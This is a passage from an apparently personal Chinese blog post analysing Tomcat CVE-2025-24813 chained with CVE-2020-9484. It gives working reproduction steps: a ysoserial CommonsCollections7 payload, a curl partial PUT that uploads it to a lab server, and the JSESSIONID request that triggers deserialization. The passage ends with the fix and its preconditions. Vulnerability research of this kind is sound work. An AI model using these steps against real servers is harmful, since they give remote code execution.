<h3 id="反序列化利用："><a href="#反序列化利用：" class="headerlink" title="反序列化利用："></a>反序列化利用：</h3><p>之前有一个漏洞为CVE-2020-9484 tomcat session持久化漏洞。这个漏洞要求要开启session持久化功能，这样会就会去反序列化以.session结尾的文件。而这里我们又可以去创建对应的.session文件。那么综合利用起来，即可达到RCE的效果。</p>
<p>所以这里我们直接锁定FileStore类的load函数，并将我们的请求路径改为<code>/poc/session</code><br>现在利用CVE-2020-9484漏洞的poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Cookie: JSESSIONID=.poc<br></code></pre></td></tr></table></figure>

<p>漏洞利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET / HTTP/1.1<br>Host: 10.133.25.153:8081<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ak;q=0.7<br>Cookie: JSESSIONID=.poc<br>Connection: close<br></code></pre></td></tr></table></figure>

<p>尝试添加该行：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407214819453.png" alt="image-20250407214819453"></p>
<p>这里发现当前目录是从ROOT目录开始的，我们生成的临时文件也是在该目录下，那么往后走会先判断该文件是否存在，存在则绑定类加载器，通过反序列化创建Session对象。<br>现在利用本地的CC依赖去生成一个poc：<br>使用CC7这条链子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections7 calc &gt; hackpoc.ser<br></code></pre></td></tr></table></figure>

<p>由于BP不能使用Base64decoder解析器，所以直接使用curl的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl -X PUT -H &quot;Content-Range: bytes 0-1000/1200&quot; --data-binary @hackpoc.ser http://10.133.25.153:8081/poc/session<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407220733550.png" alt="image-20250407220733550"></p>
<p>之后再</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET / HTTP/1.1<br>Host: 10.133.25.153:8081<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ak;q=0.7<br>Cookie: JSESSIONID=.poc<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407220819310.png" alt="image-20250407220819310"></p>
<h2 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h2><p>在Tomcat10.1.35版本中，对其临时文件后缀以及对应的名字进行了处理，不再是我们可以进行控制的了：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250408141712936.png" alt="image-20250408141712936"></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250408141823601.png" alt="image-20250408141823601"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这个漏洞的利用条件也是比较苛刻的。</p>
<p>该CVE实际上是和CVE-2020-9484相结合起来利用的。其中其涉及到的利用条件需要开启File文件会话存储，也就是需要去开启CVE-2020-9484提到的session持久化。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zyyc0.github.io">zhangyuechuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zyyc0.github.io/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">https://zyyc0.github.io/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zyyc0.github.io" target="_blank">zyyyc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/">全网最详细调试分析过程</a></div><div class="post-share"><div class="social-share" data-image="/img/123.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/08/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">zhangyuechuan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90"><span class="toc-number">3.1.</span> <span class="toc-text">临时文件生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化利用：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">修复：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" title="CVE-2025-24813详细分析">CVE-2025-24813详细分析</a><time datetime="2025-04-08T14:50:24.000Z" title="发表于 2025-04-08 22:50:24">2025-04-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/hello-world/" title="Hello World">Hello World</a><time datetime="2025-04-08T11:41:31.008Z" title="发表于 2025-04-08 19:41:31">2025-04-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By zhangyuechuan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div><div class="footer_custom_text">Welcome to my place !</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>